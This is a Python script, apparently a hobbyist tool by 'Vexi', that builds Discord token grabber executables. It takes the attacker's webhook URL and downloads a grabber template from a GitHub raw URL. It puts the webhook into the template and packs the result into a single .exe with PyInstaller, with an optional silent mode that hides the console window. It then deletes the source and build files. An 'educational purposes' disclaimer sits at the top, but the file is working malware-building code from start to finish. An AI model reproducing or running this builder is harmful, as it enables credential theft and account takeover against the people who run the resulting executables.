# Disclaimer: This is only for entertainment and educational purposes.  
# I'm not responsible for what you do with it or any consequences.  
# Made by Vexi :3

import subprocess
import sys
import os
import time
import shutil
import requests
import asyncio
from colorama import *
init(autoreset=True)

title = Fore.LIGHTRED_EX + """
╶┬╴╭─╮╷╭ ╭─╴╭╮╷   ╭─╴╭─╮╭─╮╭╮ ╭╮ ╭─╴╭─╮
 │ │ │├┴╮├╴ │╰┤   │╶╮├┬╯├─┤├┴╮├┴╮├╴ ├┬╯
 ╵ ╰─╯╵ ╵╰─╴╵ ╵   ╰─╯╵╰╴╵ ╵╰─╯╰─╯╰─╴╵╰╴
""" + Style.RESET_ALL

print(title)

menu = Fore.LIGHTRED_EX + """
[ 1 ] Build Token Grabber
[ 0 ] Exit
""" + Style.RESET_ALL

async def main():
    print(menu)
    choice = int(input(Fore.CYAN + "Choose → " + Style.RESET_ALL))
    
    if choice == 1:
        file_name = input(Fore.CYAN + "What should the file be called? → " + Style.RESET_ALL)
        webhook = input(Fore.CYAN + "Enter your webhook url → " + Style.RESET_ALL)
        silent_mode = input(Fore.CYAN + "Enable silent mode? (y/n) → " + Style.RESET_ALL).strip().lower()

        template = r"https://raw.githubusercontent.com/vn4thyt/vnsyt/refs/heads/main/Stuff/Discord%20Token%20Grabber/ignore/template.py"
        source = requests.get(template).text

        if file_name.lower().endswith(".py") or file_name.lower().endswith(".pyw"):
            file_name = file_name.rsplit('.', 1)[0]

        if silent_mode == "y":
            file_name += ".pyw"
        else:
            file_name += ".py"
        
        try:
            print(Fore.LIGHTGREEN_EX + f"""
File name → {file_name}
Webhook → {webhook}
Silent mode → {silent_mode.upper()}
""" + Style.RESET_ALL)
            
            confirm = input(Fore.LIGHTGREEN_EX + f"Would you like to confirm these? (y/n) → " + Style.RESET_ALL).strip().lower()

            if confirm == "y":
                directory = os.path.dirname(os.path.abspath(__file__))

                print(Fore.LIGHTGREEN_EX + "Creating builds folder." + Style.RESET_ALL)
                folder_path = os.path.join(directory, 'Builds')
                os.makedirs(folder_path, exist_ok=True)
                print(Fore.LIGHTGREEN_EX + "Builds folder created." + Style.RESET_ALL)

                print(Fore.LIGHTGREEN_EX + "Creating file." + Style.RESET_ALL)
                file_path = os.path.join(folder_path, file_name)
                with open(file_path, 'w', encoding='utf-8') as f:
                    print(Fore.LIGHTGREEN_EX + "File created." + Style.RESET_ALL)
                    print(Fore.LIGHTGREEN_EX + "Writing file contents." + Style.RESET_ALL)
                    modified_source = source.replace("{placeholder_webhook}", webhook)
                    f.write(modified_source)
                    print(Fore.LIGHTGREEN_EX + "File contents written." + Style.RESET_ALL)       

                print(Fore.LIGHTGREEN_EX + "Installing pyinstaller." + Style.RESET_ALL)
                subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller"], capture_output=True)
                print(Fore.LIGHTGREEN_EX + "Pyinstaller installed." + Style.RESET_ALL)
                print(Fore.LIGHTGREEN_EX + "Waiting for pyinstaller." + Style.RESET_ALL)
                time.sleep(5)

                print(Fore.LIGHTGREEN_EX + "Converting file into exe." + Style.RESET_ALL)
                original_dir = os.getcwd()
                os.chdir(folder_path)
                result = subprocess.run([sys.executable, "-m", "PyInstaller", file_name, "--onefile", "--clean"], 
                                      capture_output=True, text=True)
                
                if result.returncode != 0:
                    print(Fore.RED + f"PyInstaller error: {result.stderr}" + Style.RESET_ALL)
                    os.chdir(original_dir)
                    return
                
                print(Fore.LIGHTGREEN_EX + "Converted file into exe." + Style.RESET_ALL)

                print(Fore.LIGHTGREEN_EX + "Doing some finishing touches." + Style.RESET_ALL)
                build_path = os.path.join(folder_path, 'build')
                dist_path = os.path.join(folder_path, 'dist')

                base_name = file_name.rsplit('.', 1)[0]
                exe_file_name = base_name + '.exe'
                spec_file_name = base_name + '.spec'
                
                exe_path = os.path.join(dist_path, exe_file_name)
                spec_file = os.path.join(folder_path, spec_file_name)

                if os.path.exists(exe_path):
                    final_exe_path = os.path.join(folder_path, exe_file_name)
                    shutil.move(exe_path, final_exe_path)
                    print(Fore.LIGHTGREEN_EX + f"Moved exe file to Builds folder!" + Style.RESET_ALL)
                
                if os.path.exists(file_path):
                    os.remove(file_path)
                    print(Fore.LIGHTGREEN_EX + f"Deleted original Python file!" + Style.RESET_ALL)
                
                if os.path.exists(spec_file):
                    os.remove(spec_file)
                    print(Fore.LIGHTGREEN_EX + f"Deleted .spec file!" + Style.RESET_ALL)
                
                if os.path.exists(build_path):
                    try:
                        shutil.rmtree(build_path)
                        print(Fore.LIGHTGREEN_EX + f"Deleted build folder" + Style.RESET_ALL)
                    except Exception as e:  
                        print(Fore.YELLOW + f"Failed to delete build folder: {e}" + Style.RESET_ALL)
                        print(Fore.YELLOW + "You may need to delete this folder manually." + Style.RESET_ALL)
                
                if os.path.exists(dist_path) and os.path.isdir(dist_path):
                    try:
                        shutil.rmtree(dist_path)
                        print(Fore.LIGHTGREEN_EX + f"Deleted dist folder" + Style.RESET_ALL)
                    except Exception as e:
                        print(Fore.YELLOW + f"Failed to delete dist folder: {e}" + Style.RESET_ALL)
                        print(Fore.YELLOW + "You may need to delete this folder manually." + Style.RESET_ALL)
                
                print(Fore.LIGHTGREEN_EX + "Finishing touches complete." + Style.RESET_ALL)
                os.chdir(original_dir)

                print(Fore.CYAN + f"Token grabber made.\nToken grabber file located at: {os.path.join(folder_path, exe_file_name)}" + Style.RESET_ALL)
            else:
                print(Fore.LIGHTRED_EX + "Cya." + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"Error creating token grabber: {e}" + Style.RESET_ALL)
    
    elif choice == 0:
        print(Fore.LIGHTRED_EX + "Exiting..." + Style.RESET_ALL)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(Fore.RED + "\nInterrupted" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"Unexpected error: {e}" + Style.RESET_ALL)
        input("Press Enter to exit.")
